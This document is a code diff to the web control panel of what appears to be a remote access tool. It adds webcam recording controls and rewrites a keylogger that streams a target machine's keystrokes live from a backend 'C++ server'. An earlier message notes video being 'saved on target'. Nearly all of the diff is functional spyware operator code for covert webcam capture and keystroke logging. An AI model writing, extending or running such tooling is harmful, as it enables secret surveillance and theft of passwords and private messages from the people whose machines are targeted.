@@ -142,7 +142,9 @@
             <h4>WEBCAM STREAM</h4>
             <div>
                 <button onclick="toggleCam(true)" class="btn btn-success btn-sm">START STREAM</button>
-                <button onclick="toggleCam(false)" class="btn btn-danger btn-sm">STOP & SAVE</button>
+                <button onclick="toggleRecord('start')" class="btn btn-warning btn-sm">🔴 RECORD</button>
+                <button onclick="toggleRecord('stop')" class="btn btn-secondary btn-sm">⏹ STOP RECORD</button>
+                <button onclick="toggleCam(false)" class="btn btn-danger btn-sm">STOP STREAM</button>
             </div>
         </div>
         <div class="screen-box">
@@ -157,7 +159,7 @@
             <div>
                 <button onclick="toggleKey(true)" class="btn btn-warning btn-sm">START</button>
                 <button onclick="toggleKey(false)" class="btn btn-secondary btn-sm">STOP</button>
-                <button onclick="document.getElementById('key-term').innerHTML=''" class="btn btn-outline-light btn-sm">CLEAR</button>
+                <button onclick="clearKeylog()" class="btn btn-outline-light btn-sm">CLEAR</button>
             </div>
         </div>
         <div id="key-term" class="log-terminal">Waiting for input stream...</div>
@@ -166,6 +168,9 @@
 </div>
 
 <script>
+    let eventSource = null;
+    let isKeyloggerActive = false;
+
     function showTab(id) {
         document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
         document.getElementById(id).classList.add('active');
@@ -206,26 +211,102 @@
 
     function toggleCam(state) {
         const img = document.getElementById('cam-img');
-        if(state) img.src = '/video_feed';
-        else { img.src = ''; fetch('/api/webcam/off', {method:'POST'}); alert("Webcam stopped. Video saved on target."); }
+        if(state) {
+            img.src = '/video_feed?t=' + Date.now();
+            alert("📹 Webcam stream started");
+        } else { 
+            img.src = ''; 
+            fetch('/api/webcam/off', {method:'POST'})
+                .then(r => r.json())
+                .then(d => alert(d.status));
+        }
     }
 
-    let evtSource = null;
+    function toggleRecord(action) {
+        fetch('/api/webcam/record', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({action: action})
+        })
+        .then(r => r.json())
+        .then(d => alert(d.status));
+    }
+
     function toggleKey(state) {
-        fetch('/api/keylog/toggle', {
-            method:'POST', headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({state: state})
-        });
         const term = document.getElementById('key-term');
-        if(state) {
-            term.innerHTML += "\n[SYSTEM] Logger Started...\n";
-            if(evtSource) evtSource.close();
-            evtSource = new EventSource('/api/keylog/stream');
-            evtSource.onmessage = e => { term.innerHTML += e.data; term.scrollTop = term.scrollHeight; }
+        
+        if (state) {
+            if (isKeyloggerActive) return;
+            
+            isKeyloggerActive = true;
+            term.textContent = "[SYSTEM] Starting keylogger...\n";
+            
+            // Đóng stream cũ
+            if (eventSource) {
+                eventSource.close();
+                eventSource = null;
+            }
+            
+            // Gửi lệnh START
+            fetch('/api/keylog/toggle', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ state: true })
+            })
+            .then(() => {
+                // Đợi 2 giây để C++ server ready
+                setTimeout(() => {
+                    eventSource = new EventSource('/api/keylog/stream');
+                    
+                    eventSource.onmessage = function(e) {
+                        if (e.data.includes('[ERROR]') || e.data.includes('[DISCONNECTED]')) {
+                            term.textContent += e.data + '\n';
+                            if (eventSource) {
+                                eventSource.close();
+                                eventSource = null;
+                            }
+                            isKeyloggerActive = false;
+                            return;
+                        }
+                        
+                        term.textContent += e.data;
+                        term.scrollTop = term.scrollHeight;
+                    };
+                    
+                    eventSource.onerror = function(e) {
+                        console.error('[ERROR] EventSource error');
+                        term.textContent += '\n[ERROR] Connection lost\n';
+                        if (eventSource) {
+                            eventSource.close();
+                            eventSource = null;
+                        }
+                        isKeyloggerActive = false;
+                    };
+                }, 2000);
+            });
+            
         } else {
-            if(evtSource) evtSource.close();
-            term.innerHTML += "\n[SYSTEM] Logger Stopped.\n";
+            // STOP
+            isKeyloggerActive = false;
+            
+            if (eventSource) {
+                eventSource.close();
+                eventSource = null;
+            }
+            
+            fetch('/api/keylog/toggle', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ state: false })
+            })
+            .then(() => {
+                term.textContent += '\n[SYSTEM] Keylogger stopped\n';
+            });
         }
+    }
+
+    function clearKeylog() {
+        document.getElementById('key-term').textContent = '';
     }
 </script>
 </body>
